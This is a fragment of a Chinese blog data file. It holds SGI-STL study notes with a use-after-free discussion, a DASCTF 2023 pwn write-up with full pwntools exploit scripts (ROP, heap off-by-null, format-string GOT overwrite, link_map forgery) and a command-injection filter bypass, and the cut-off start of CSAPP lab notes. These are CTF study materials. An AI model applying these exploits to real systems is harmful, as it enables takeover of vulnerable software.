title="copy"></a>copy</h3><p>主要学习函数dispatch<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202304091803715.png"></p><h3 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h3><p>push_heap:新加入的元素放在最后一个结点,循环与父节点比较判断是否交换.<br>pop_heap:将根节点的值与最后一个结点的值交换(交换只是一种说法,实际实现可以不同),让最后一个结点进行下溯交换,直到回到根节点当前位置的前一个.<br>sort_heap:反复进行pop_heap,每次将finish-1即可排序.<br>make_heap:使用pop_heap类似的下溯操作,从最后一个父节点开始依次进行下溯后再使用push_heap操作完成实质的父子结点比较排序过程.</p><p>要注意一点,下溯操作仅是下放某个结点,并不涉及排序.所以《STL源码剖析》一书中侯捷的注释是错误的.按书上更改后,pop_heap调用时若左叶子结点的值小于右叶子节点的值发生错误,make_heap调用时也是错误.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309111124768.png"></p><h2 id="配接器"><a href="#配接器" class="headerlink" title="配接器"></a>配接器</h2><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>单端开口先进先出.<br>Stack内部以deque为底层容器进行封装,不存在迭代器.也可以以list为底层容器.</p><h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><p>单端开口先进后出<br>Queue内部以deque为底层容器进行封装,不存在迭代器.也可以以list为底层容器.</p><h3 id="priority-queue"><a href="#priority-queue" class="headerlink" title="priority_queue"></a>priority_queue</h3><p>单端开口,出队顺序由排序方式决定.<br>以vector为底层容器进行封装,算法主要由heap算法实现.</p><h3 id="set-map"><a href="#set-map" class="headerlink" title="set map"></a>set map</h3><p>默认均以rb_tree为底层容器,区别是前者键值相同,后者键值类型不一定相同.</p><h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><h2 id="思考题1"><a href="#思考题1" class="headerlink" title="思考题1"></a>思考题1</h2><blockquote><p>在写容器的时候 容器里有很多的成员函数或者非成员函数 。有的容器都有对元素的增删操作 ，那么这些操作在如何不恰当使用的情况下，会造成安全问题请构造出poc来 。</p></blockquote><h3 id="漏洞1"><a href="#漏洞1" class="headerlink" title="漏洞1"></a>漏洞1</h3><p>这个其实不能算是容器的增删操作导致的,而是所有类中指针的通病.<br>在没有重载复制(构造)函数情况下,默认的复制(构造)函数会直接复制指针的值(浅拷贝),当其中一个对象销毁时释放掉指针内存而另一个对象还保留着已释放内存的指针.<br>如图,vec和vec2使用同一块内存,若vec被销毁,vec2中仍存有该内存指针造成uaf.<br>(由于STL二级空间置配器并未真正释放内存给操作系统,所以asan并未检测到double free)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202304162312107.png"><br>改用一级空间置配器检测到double free.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202304162322079.png"></p><p>重载拷贝构造函数后正常:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309141856874.png"></p><h2 id="思考题2"><a href="#思考题2" class="headerlink" title="思考题2"></a>思考题2</h2><blockquote><p>为什么实现了uninitialized_xxx和copy/fill这样两组不同的函数</p></blockquote><ul><li><code>uninitialized_xx</code>函数，其内部会执行结构体的构造函数。该函数面向于<code>尚未进行初始化</code>的内存。</li><li>而没有“<code>uninitialized_</code>”前缀的函数，面向的是<code>已经初始化过</code>的内存。所以不需要再执行构造函数。</li></ul><p>对已包含元素的内存中调用uninitialized_copy,可能导致对象未析构,或者出现问题1同样的情况,如copy,因重载的赋值运算符未被调用而导致浅拷贝的发生.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309141803372.png"></p><h2 id="思考题3"><a href="#思考题3" class="headerlink" title="思考题3"></a>思考题3</h2><blockquote><p>理解每个容器的内存模型。</p></blockquote><ul><li>vector的内存模型是一个数组。</li><li>list的内存模型是一个带空结点的双向循环链表.</li><li>deque的内存模型是多个buffer缓冲区和管理buffer的map数组.</li><li>set,map的内存模型是平衡二叉树(红黑树)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 程序设计 </category>
          
          <category> SGI-STL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL </tag>
            
            <tag> CPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 2023六月挑战赛｜二进制专项 复现</title>
      <link href="/2023/DASCTF-2023-June-Binary-WP/"/>
      <url>/2023/DASCTF-2023-June-Binary-WP/</url>
      
        <content type="html"><![CDATA[<p>(<del>距上一次好好看题应该有两个月了吧….</del></p><h2 id="Dream"><a href="#Dream" class="headerlink" title="Dream"></a>Dream</h2><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>第一次看多线程的题.没开pie和canary.<br>主线程在开启一个子线程后开启沙盒只能使用read,write调用,然后是一个0x10字节的溢出.<br>子线程是一个write的无限循环.</p><span id="more"></span><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>主线程禁掉了open,所以无法进行orw.由于子线程是在主线程开启沙箱前创建的,不受沙箱影响.所以最终是要在子线程中执行system.<br>要通过主线程的溢出劫持子线程的控制流,可以通过线程间共享的got表.将write的got表改为主线程中溢出的地址.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307161610872.png"></p><p>由于新线程的栈是mmap得到的,所以可以利用其与libc的固定偏移得到.在子线程上再进行栈迁移+rop.<br>(感觉这题的各种偏移巧妙得诡异)</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">magic_read = <span class="number">0x4013AE</span></span><br><span class="line">bss = <span class="number">0x404200</span></span><br><span class="line">rdi = <span class="number">0x401483</span></span><br><span class="line">rsi_r15 = <span class="number">0x401481</span> </span><br><span class="line">ret = <span class="number">0x4013c6</span></span><br><span class="line">leave_ret = <span class="number">0x4013c5</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">'''</span></span><br><span class="line"><span class="string">set scheduler-locking on</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">b *0x4013AE</span></span><br><span class="line"><span class="string">thread 2</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#主线程劫持子线程控制流</span></span><br><span class="line">io.recvline()</span><br><span class="line">io.send(<span class="string">b'a'</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(magic_read))</span><br><span class="line"></span><br><span class="line">payload = flat([rsi_r15,e.got[<span class="string">'write'</span>],<span class="number">0</span>,e.plt[<span class="string">'read'</span>],rdi,<span class="number">0x1000</span>,e.plt[<span class="string">'sleep'</span>]])</span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">payload += flat([bss-<span class="number">8</span>,leave_ret])</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.send(p64(magic_read))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#子线程栈迁移+rop</span></span><br><span class="line">io.recv()</span><br><span class="line">payload = flat([<span class="string">'a'</span>*<span class="number">0x30</span>,rdi,e.got[<span class="string">'puts'</span>],e.plt[<span class="string">'puts'</span>],p64(magic_read)])</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">leak_libc(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">thread_stack = libc_base-<span class="number">0x41f0</span></span><br><span class="line"></span><br><span class="line">rdi_rbp = libc_base+<span class="number">0x2a745</span></span><br><span class="line"></span><br><span class="line">payload = flat([ret,rdi_rbp,binsh_addr,<span class="number">0</span>,system_addr])</span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">payload += flat([thread_stack-<span class="number">8</span>,leave_ret])</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Noka"><a href="#Noka" class="headerlink" title="Noka"></a>Noka</h2><p>任意地址读写没啥好说的.<br>学到一个trick就是改malloc的got表为一个可控返回值(read_num之类)的函数,再加上之后的read可以达成任意地址写.</p><h2 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h2><p>验证身份,由于snprintf限制了长度0x20,可以将%s后面的.key顶出0x20外截断.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">'admin :'</span>,<span class="string">b'..///////////////////flag'</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307180900152.png"><br>然后是一个有过滤的命令拼接.<br>命令之间用’\n’截断,过滤了空格用’\t’分隔参数.<br>注意闭合%s前面的单引号.<br>由于长度限制最后flag用通配符.<br>缓冲区未初始化,所以可以多次写入\n.<br>最后命令是这样的: ‘\ncat\tfl*\n.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307180911843.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307180904864.png"></p><p>由于缓冲区未初始化,也可以在验证函数的栈帧里布置来绕开过滤.</p><h2 id="Approoooooooaching"><a href="#Approoooooooaching" class="headerlink" title="Approoooooooaching"></a>Approoooooooaching</h2><p>Brainfuck的VM(<del>其实到现在对VM的概念都很模糊</del>).<br>洞在执行的时候对v3没有下界检查,可以直接越界修改返回地址,partial overwrite到后门函数.</p><p>(下次一定记得先找后门,还有就是逆向时看个大概就行了,老是想着把每条语句都看懂…)</p><h2 id="can-you-find-me"><a href="#can-you-find-me" class="headerlink" title="can_you_find_me"></a>can_you_find_me</h2><p>2.27的offbynull,没有输出函数,限制free和malloc次数.有一点特殊的是null会写在chunk[size]的地方,也就是只与size有关而与输入长度无关,这也是之后能部分覆写unsortedbin的fd的原因.</p><p>常规流程了,我的布置用完了free的次数所以打malloc_hook</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'Index:'</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">og = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># offbynull构造堆块重叠,部分覆写unsortedbin</span></span><br><span class="line">    add(<span class="number">0x410</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">'a'</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x30</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x28</span>,<span class="string">'a'</span>)<span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">'a'</span>)<span class="comment">#5</span></span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    payload = flat([<span class="string">'a'</span>*<span class="number">0x20</span>,<span class="number">0x4c0</span>])</span><br><span class="line">    add(<span class="number">0x28</span>,payload)<span class="comment">#1</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x410</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x2f</span>,<span class="string">b'\x60\x07'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 泄露地址</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x20</span>,p64(<span class="number">0xfbad1800</span>))<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hex</span>(addr).endswith(<span class="string">"7e3"</span>):</span><br><span class="line">            stdout = addr-<span class="number">131</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    io.recvuntil(<span class="string">'1.'</span>)</span><br><span class="line"></span><br><span class="line">    leak_libc(<span class="string">'_IO_2_1_stdout_'</span>,stdout)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    payload = flat([<span class="string">'\x00'</span>*<span class="number">0x28</span>,<span class="number">0x31</span>,malloc_hook_addr-<span class="number">0x8</span>])</span><br><span class="line">    add(<span class="number">0x40</span>,payload)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">'a'</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,p64(libc_base+og[<span class="number">1</span>])+p64(realloc_addr+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io,'''</span></span><br><span class="line">    <span class="comment"># breakrva 0xDA4</span></span><br><span class="line">    <span class="comment"># ''')</span></span><br><span class="line">    io.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,<span class="built_in">str</span>(<span class="number">520</span>))</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = process(<span class="string">'./'</span>+binary)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Candy-Shop"><a href="#Candy-Shop" class="headerlink" title="Candy_Shop"></a>Candy_Shop</h2><p>两次参数长度8字节的格式化字符串,一次数组越界bss段之前任意写.<br>先泄露地址,改printf的got表为system,完事.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'option:'</span>,<span class="string">'g'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'name'</span>,<span class="string">'%31$p'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'gift:'</span>)</span><br><span class="line">leak_libc(<span class="string">'__libc_start_main'</span>,<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'option:'</span>,<span class="string">'b'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'bye:'</span>,<span class="string">'t'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'in?'</span>,<span class="string">'-10'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'name'</span>,<span class="string">b'\x00'</span>*<span class="number">6</span>+p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'g'</span>)</span><br><span class="line">io.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="easynote"><a href="#easynote" class="headerlink" title="easynote"></a>easynote</h2><p>2.23堆溢出,没啥特别的</p><h2 id="fooooood"><a href="#fooooood" class="headerlink" title="fooooood"></a>fooooood</h2><p>bss段格式化字符串,改返回地址和参数就行了<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307211003955.png"><br>(这题不能改printf的got表因为不能一次性改完,下一次执行printf的时候会崩)</p><h2 id="matchmaking-platform"><a href="#matchmaking-platform" class="headerlink" title="matchmaking platform"></a>matchmaking platform</h2><h3 id="逆向-1"><a href="#逆向-1" class="headerlink" title="逆向"></a>逆向</h3><p>漏洞点在sub_12B7函数,该函数向a1指向空间最多读取128字节(向buf读入了129次),进入最后一次循环时,v3==127,++v3溢出到-0x80,即向a1-0x80地址写一个字节.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307292212184.png"><br>程序的主逻辑,配合上该漏洞,可以在times为4,2时修改byte_4140-0x80位置的pptr的低字节,使*pptr的新值为另一个地址,进而在times为3,1的时候在该地址进行写入.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307292223923.png"><br>于是寻找0x4000-0x4100内的指针,有GOT表和bss段的IO指针.</p><p>则可以先通过IO指针泄露pie基址并在byte_4140上伪造.dynamic以及strtab,再修改linkmap中l_info[5]为伪造的.dynamic,修改l_addr使其偏移.</p><p>使得解析free函数时得到system函数地址,且由于伪造的linkmap中l_addr(程序基地址)加上了偏移使得最终将system地址写入puts的GOT表条目.最终getshell.</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    io.sendafter(<span class="string">'&gt;&gt;'</span>,<span class="string">b'a'</span>*<span class="number">128</span>+<span class="string">b'\x80'</span>)</span><br><span class="line"></span><br><span class="line">    payload = flat([<span class="number">0xfbad1800</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">b'\xb0\x5d'</span>])</span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    addr = u64(io.recv(<span class="number">8</span>,<span class="number">0.1</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hex</span>(addr).startswith(<span class="string">"0x56"</span>):</span><br><span class="line">        pie_base = addr-<span class="number">0x40a0</span></span><br><span class="line">        log.success(<span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b'/bin/sh\x00'</span>+p64(pie_base+<span class="number">0x4140</span>+<span class="number">0x10</span>-<span class="number">0x77</span>)+<span class="string">b'system\x00'</span><span class="comment">#0x77是free字符串在strtab中的偏移</span></span><br><span class="line">    io.sendafter(<span class="string">'&gt;&gt;'</span>,payload.ljust(<span class="number">128</span>,<span class="string">b'\x00'</span>)+<span class="string">b'\x08'</span>)</span><br><span class="line"></span><br><span class="line">    payload = flat([pie_base+<span class="number">0x8</span>])</span><br><span class="line">    payload = payload.ljust(<span class="number">0x68</span>,<span class="string">b'\x00'</span>) + flat([pie_base+<span class="number">0x4140</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io,'''</span></span><br><span class="line">    <span class="comment"># b *$rebase(0x1338)</span></span><br><span class="line">    <span class="comment"># ''')    </span></span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>,payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = process(<span class="string">'./'</span>+binary)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>(剩余题目之后单独放)</p>]]></content>
      
      
      <categories>
          
          <category> ctf复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP Labs</title>
      <link href="/2023/CSAPP-Labs/"/>
      <url>/2023/CSAPP-Labs/</url>
      
        <content type="html"><![CDATA[<p>记录CSAPP Lab的一些过程和心得,由于刚开始接触计算机其实完成的质量不高.</p><span id="more"></span><h1 id="Lab1-DataLab"><a href="#Lab1-DataLab" class="headerlink" title="Lab1:DataLab"></a>Lab1:DataLab</h1><p>用位运算实现一些基本操作</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span 